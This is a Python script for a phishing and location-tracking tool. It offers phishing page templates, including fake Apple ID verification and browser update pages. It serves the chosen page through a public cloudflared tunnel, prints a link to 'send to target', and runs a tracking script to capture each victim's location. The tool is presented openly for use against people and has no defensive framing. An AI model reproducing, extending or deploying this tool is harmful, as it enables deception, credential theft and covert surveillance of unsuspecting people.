import os
import subprocess
import random
import time
import re
import sys
import threading
import signal
from termcolor import colored

# Color definitions for printing in the terminal
orange = "\033[38;5;214m"  # Approximation for orange
yellow = "\033[1;33m"      # Yellow for the exit message
light_green = "\033[1;32m"  # Light green for the link
reset = "\033[0m"          # Reset color

# Function to display the new banner
def print_banner():
    banner = colored(""" 
█████╗ ██╗     ████████╗ █████╗     ██████╗ ██████╗  ██████╗ ███████╗███████╗
██╔══██╗██║     ╚══██╔══╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔════╝
███████║██║        ██║   ███████║    ██████╔╝██████╔╝██║   ██║███████╗███████╗
██╔══██║██║        ██║   ██╔══██║    ██╔══██╗██╔══██╗██║   ██║╚════██║╚════██║
██║  ██║███████╗   ██║   ██║  ██║    ██████╔╝██║  ██║╚██████╔╝███████║███████║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝
""", 'green', attrs=['bold'])

    title = colored("🌍🌍🌍  ALTA BROSS LOCATION TRACKING TOOL  🌍🌍🌍", 'red', attrs=['bold'])

    print(banner)
    print(f"{title.center(90)}\n")  # Center the title nicely

# Template selection (with hacker-style colors)
templates = {
    1: (colored("YouTube Rick Roll Phishing Template", 'red', attrs=['bold']), "youtube.html"),
    2: (colored("WiFi Phishing Template", 'cyan', attrs=['bold']), "wifi.html"),
    3: (colored("Gift Claim Phishing Template", 'magenta', attrs=['bold']), "gift.html"),
    4: (colored("Browser Update Phishing Template", 'yellow', attrs=['bold']), "browser.html"),
    5: (colored("Apple ID Verification Phishing Template", 'blue', attrs=['bold']), "Appleidverification.html")
}

# Insults list (rotates through these for wrong inputs)
insults = [
    "💀 YOU CAN'T EVEN TYPE A NUMBER? PATHETIC. TRY AGAIN.",
    "🤡 I KNEW HUMANS WERE DUMB, BUT YOU'RE PROVING IT.",
    "🧠 MAYBE READ THE OPTIONS BEFORE TYPING GARBAGE?",
    "😈 IF YOU KEEP MESSING UP, I MIGHT JUST HACK *YOU* INSTEAD.",
    "💩 THAT WAS A STUPID CHOICE. TRY AGAIN, FOOL.",
    "🤖 EVEN AN AI COULD DO BETTER THAN THIS. OH WAIT... I AM AN AI."
]

def choose_template():
    while True:
        # Add clear gap above the prompt
        print("\n\n")

        # Display the red "Choose the option" line and make it stand out
        print(colored("📜 Choose the option 💀 Deadroot:", 'red', attrs=['bold']))

        # Add space for better visibility
        print("\n")
        
        # Display the options with numbers styled in hacker-like format
        for key, (name, _) in templates.items():
            print(f"  {colored(f'[{key}]', 'green', attrs=['bold'])} {name}")

        # Add space below for better readability
        print("\n")

        # Get user input with a clear prompt and Deadroot emoji
        choice = input(colored("💀 Deadroot: ", 'red', attrs=['bold'])).strip()

        if choice.lower() == "exit":
            print("\n🚪 Coward. Running away, huh? Goodbye. 👋")
            exit()

        if choice.isdigit():
            choice = int(choice)
            if choice in templates:
                return templates[choice][1]  # Return the selected template filename

        # Show a different insult every time and restart the prompt
        insult = random.choice(insults)
        print(f"\n{colored(insult, 'red', attrs=['bold'])}\n")

        # Wait for the user to press Enter to continue
        input("\n💀 Press Enter to try again...")

def update_template(chosen_template):
    public_dir = 'Templates'
    template_path = os.path.join(public_dir, chosen_template)
    index_path = os.path.join(public_dir, 'index.html')

    # Check if the chosen template exists
    if os.path.exists(template_path):
        # Replace index.html with selected template
        with open(template_path, 'r') as template_file:
            content = template_file.read()
        with open(index_path, 'w') as index_file:
            index_file.write(content)
        
        # Silent after updating
        pass

        # Run the cloudflared tunnel after updating the template
        run_cloudflared_tunnel()
    else:
        print(f"\n❌ Error: {chosen_template} does not exist in the 'public' directory!\n")

def run_cloudflared_tunnel():
    global CLOUDFLARED_PROCESS

    # Set up signal handler for cleanup
    signal.signal(signal.SIGINT, cleanup)

    # Make cloudflared executable
    os.chmod("cloudflared", 0o755)

    # Print starting message
    print("\033[1;92m[\033[0m+\033[1;92m] Starting cloudflared tunnel...\033[0m")

    # Remove previous log if exists
    try:
        os.remove("cf.log")
    except FileNotFoundError:
        pass

    # Start cloudflared tunnel
    CLOUDFLARED_PROCESS = subprocess.Popen(
        ["./cloudflared", "tunnel", "--url", "127.0.0.1:8080", "--logfile", "cf.log"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Wait for tunnel to establish
    time.sleep(10)

    # Extract URL from log file
    link = None
    try:
        with open("cf.log", "r") as f:
            for line in f:
                match = re.search(r"https://[-0-9a-z]*\.trycloudflare\.com", line)
                if match:
                    link = match.group(0)
                    break
    except FileNotFoundError:
        pass

    if not link:
        print("\033[1;31m[!] Direct link is not generating\033[0m")
        sys.exit(1)

    # Print the forwarding URL
    print(f"\n{orange}SEND THIS LINK TO TARGET:{reset} {light_green}{link}{reset}\n")
    
    # Print the "Waiting for the target to click the link" message
    print(f"\n{colored('💻 Waiting for the target to click the link...', 'green', attrs=['bold'])}\n")
    
    # Now run the track.js script
    run_track_script()

def run_track_script():
    track_script_path = "track.js"
    
    if os.path.exists(track_script_path):
        subprocess.run(["node", track_script_path])
    else:
        print("\n⚠ Warning: track.js not found! Make sure it's in the same directory.\n")

# Cleanup function for ctrl+C (no stopping message)
def cleanup(signum, frame):
    # Terminate the cloudflared process
    if CLOUDFLARED_PROCESS:
        CLOUDFLARED_PROCESS.terminate()
    print(f"\n{yellow}Thank you for using the Alta Bross Location Tracking Tool. Goodbye, Son...{reset}")
    sys.exit(0)

def main():
    print_banner()
    try:
        chosen_template = choose_template()
        update_template(chosen_template)
    except KeyboardInterrupt:
        print(f"\n{yellow}Thank you for using the Alta Bross Location Tracking Tool. Goodbye, Son...{reset}")
        sys.exit(0)

if __name__ == "__main__":
    main()
